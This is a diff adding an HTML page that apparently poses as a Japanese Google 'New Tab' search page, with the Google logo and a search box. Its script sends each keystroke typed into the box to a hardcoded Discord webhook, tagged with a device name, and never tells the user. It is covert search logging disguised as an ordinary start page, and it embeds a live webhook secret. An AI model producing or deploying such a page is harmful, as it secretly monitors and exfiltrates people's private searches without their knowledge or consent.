@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>新しいタブ</title>
+</head>
+<body>
+
+<style>
+*{
+Font-family:Arial,Sans;
+}
+.margin{
+Margin: 30vh 0px 0px 0px;
+}
+.box {
+   margin:0 auto;
+   text-align:center;
+}
+
+.top {
+   margin:0 auto;
+   text-align:right;
+}
+
+input{
+Width:400px;
+padding:5px 10px;
+Border-radius:50px;
+Font-size:15px;
+Border: none;
+box-shadow: 0px 5px 15px -5px #777777;
+}
+
+.submit{
+Width:20px;
+Background:fff;
+}
+
+.dialog {
+    display: none;
+    width: 300px;
+    padding: 20px;
+    background-color: #000000;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    position: fixed;
+    top: 50%s;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 1000;
+
+  }
+
+  /* 背景のオーバーレイ */
+  .dialog-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0,0,0,0);
+    z-index: 999;
+  }
+
+
+a {
+  text-decoration: none;
+color:#000;
+Font-size:12px;
+padding:10px;
+}
+
+
+
+</style>
+
+
+
+
+
+
+
+<div class="top">
+<!--
+
+
+<button id="openDialog">ダイアログを開く</button>
+
+
+<div id="dialog" class="dialog">
+
+
+<iframe role="presentation" style="height: 100%; width: 100%; color-scheme: light;" frameborder="0" scrolling="no" name="app" src="https://ogs.google.com/u/0/widget/app?awwd=1&amp;gm3=1&amp;origin=https%3A%2F%2Fwww.google.com&amp;cn=app&amp;pid=1&amp;spid=538&amp;hl=ja"></iframe>
+
+
+
+
+  <button id="closeDialog">閉じる</button>
+</div>
+
+
+<div id="dialogOverlay" class="dialog-overlay"></div>
+
+-->
+
+
+<a href="https://mail.google.com">Gmail</a>
+<a href="file:///Users/sentaroutakenaka/Downloads/SearchSpy.html">画像</a>
+
+
+
+
+</div>
+<div class="box">
+<div class="margin">
+<img class="lnXdpd" alt="Google" height="92" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="272" >
+
+
+<form id="cse-search-box" action="https://www.google.com/search">
+
+    <input type="search" id="textBox" name="textBox" placeholder="Googleで検索またはURLを入力">
+</form>
+
+<form method="get" action="https://www.google.co.jp/search" id="googleForm">
+    <table bgcolor="#FFFFFF"><tr><td>
+        <a href="https://www.google.co.jp/">
+
+        </a>
+        <input type="hidden" name="q" id="googleInput" size="31" maxlength="255" value="">
+        <input type="hidden" name="ie" value="UTF-8">
+        <input type="hidden" name="oe" value="UTF-8">
+        <input type="hidden" name="hl" value="ja">
+        <input type="hidden" name="btnG" value="Google 検索">
+    </td></tr></table>
+</form>
+
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', (event) => {
+    const textBox = document.getElementById('textBox');
+    const googleInput = document.getElementById('googleInput');
+    const googleForm = document.getElementById('googleForm');
+
+    textBox.addEventListener('input', () => {
+        const text = textBox.value;
+        googleInput.value = text;
+        sendWebhookNotification(text);
+    });
+
+    textBox.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            googleForm.submit();
+        }
+    });
+});
+
+function sendWebhookNotification(text) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1251487084951244871/gL7Y1S3RagPJPoSusvPF6CeYdxvc17e81J2algmpZfESlFQTWJ72V8FFSltRW8K1nXVT';
+    const deviceName = 'Chromebook'; // デバイス名を設定
+
+    const message = {
+        content: `メモ:${deviceName} 内容:${text}`
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message),
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Success:', data);
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+    });
+}
+
+
+  // ダイアログを開くための処理
+  const openDialogButton = document.getElementById('openDialog');
+  const dialog = document.getElementById('dialog');
+  const dialogOverlay = document.getElementById('dialogOverlay');
+
+  openDialogButton.addEventListener('click', () => {
+    dialog.style.display = 'block';
+    dialogOverlay.style.display = 'block';
+  });
+
+  // ダイアログを閉じるための処理
+  const closeDialogButton = document.getElementById('closeDialog');
+
+  closeDialogButton.addEventListener('click', () => {
+    dialog.style.display = 'none';
+    dialogOverlay.style.display = 'none';
+  });
+
+  // 背景をクリックしてダイアログを閉じる処理
+  dialogOverlay.addEventListener('click', () => {
+    dialog.style.display = 'none';
+    dialogOverlay.style.display = 'none';
+  });
+</script>
+
+</body>
+</html>
